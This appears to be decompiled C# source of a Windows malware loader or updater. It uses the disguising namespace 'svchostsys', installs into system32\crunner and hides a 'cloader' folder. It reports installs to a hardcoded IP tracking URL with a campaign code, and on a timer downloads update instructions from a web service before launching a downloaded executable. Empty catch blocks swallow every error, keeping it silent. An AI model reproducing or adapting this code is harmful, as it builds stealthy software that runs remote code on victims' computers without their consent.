using System;
using System.Configuration;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Windows.Forms;
using svchostsys.WebServiceUpdate;

namespace svchostsys;

public class UpdateChecker
{
	private static Timer myTimer = new Timer();

	private static string strWinXPPath = "C:\\windows\\system32\\";

	private static string strWinXPCurrentPath = "C:\\windows\\system32\\crunner\\";

	private static string strWinServerPath = "C:\\winnt\\system32\\";

	private static string strWinServerCurrentPath = "C:\\winnt\\system32\\crunner\\";

	private static string strCurrentPath = string.Empty;

	private static string strCloaderPath = "C:\\Program Files\\Common Files\\cloader\\";

	private static string strProjectName = ConfigurationSettings.get_AppSettings()["ProjectName"];

	private static string TRACKING_CODE = "Wrpr_TargSave082106";

	private static string TRACKING_INSTALL_LINK = "http://209.213.106.158/tracking/trackrequest.asp?type=install&code=";

	[STAThread]
	private static void Main()
	{
		try
		{
			myTimer.add_Tick((EventHandler)TimerEventProcessor);
			myTimer.set_Interval(Convert.ToInt32(ConfigurationSettings.get_AppSettings()["UpdateTimeInterval"]));
			myTimer.Start();
		}
		catch
		{
		}
		if (Directory.Exists(strCloaderPath))
		{
			File.SetAttributes(strCloaderPath, FileAttributes.Hidden);
		}
		Application.Run();
	}

	private static void TimerEventProcessor(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		try
		{
			Timer val = (Timer)sender;
			try
			{
				val.Stop();
				UpdateChecker updateChecker = new UpdateChecker();
				updateChecker.GetUpdates();
			}
			catch
			{
			}
			finally
			{
				val.Start();
			}
			GC.Collect();
		}
		catch
		{
		}
	}

	public void GetUpdates()
	{
		try
		{
			if (Directory.Exists(strWinXPPath))
			{
				strCurrentPath = strWinXPCurrentPath;
			}
			else if (Directory.Exists(strWinServerPath))
			{
				strCurrentPath = strWinServerCurrentPath;
			}
			StreamReader streamReader = new StreamReader(strCurrentPath + "Version.txt");
			int num = Convert.ToInt32(streamReader.ReadLine());
			streamReader.Close();
			if (num == 1)
			{
				using WebClient webClient = new WebClient();
				webClient.OpenRead(TRACKING_INSTALL_LINK + TRACKING_CODE);
			}
			Update update = new Update();
			UpdateData[] array = update.CheckForUpdates(strProjectName, num);
			if (array != null && array[0].DoUpdate)
			{
				StreamWriter streamWriter = new StreamWriter(strCurrentPath + "cupdater.exe.config", append: false);
				streamWriter.WriteLine("<?xml version=\"1.0\" encoding=\"utf-8\" ?>");
				streamWriter.WriteLine("<configuration>");
				streamWriter.WriteLine("\t<appSettings>");
				streamWriter.WriteLine("\t\t<add key=\"Update\" value=\"1\" />");
				streamWriter.WriteLine("\t\t<add key=\"UpdateURL\" value=\"" + ConfigurationSettings.get_AppSettings()["UpdateURL"] + "\" />");
				streamWriter.WriteLine("\t\t<add key=\"UpdateTimeInterval\" value=\"" + ConfigurationSettings.get_AppSettings()["UpdateTimeInterval"] + "\" />");
				streamWriter.WriteLine("\t\t<add key=\"SleepTime\" value=\"" + ConfigurationSettings.get_AppSettings()["SleepTime"] + "\" />");
				streamWriter.WriteLine("\t\t<add key=\"ProjectName\" value=\"" + array[0].ProjectName + "\" />");
				streamWriter.WriteLine("\t\t<add key=\"VersionNumber\" value=\"" + array[0].VersionNumber + "\" />");
				streamWriter.WriteLine("\t\t<add key=\"StartExe\" value=\"" + array[0].ExeName + "\" />");
				streamWriter.WriteLine("\t\t<add key=\"StartExeName\" value=\"" + array[0].ProjectName + "\" />");
				streamWriter.WriteLine("\t\t<add key=\"ZipFile\" value=\"" + array[0].ZipName + "\" />");
				streamWriter.WriteLine("\t</appSettings>");
				streamWriter.WriteLine("</configuration>");
				streamWriter.Flush();
				streamWriter.Close();
				StreamWriter streamWriter2 = new StreamWriter(strCurrentPath + "Version.txt");
				streamWriter2.WriteLine(array[0].VersionNumber);
				streamWriter2.Flush();
				streamWriter2.Close();
				Process.Start(strCurrentPath + "cupdater.exe");
			}
		}
		catch
		{
		}
	}
}
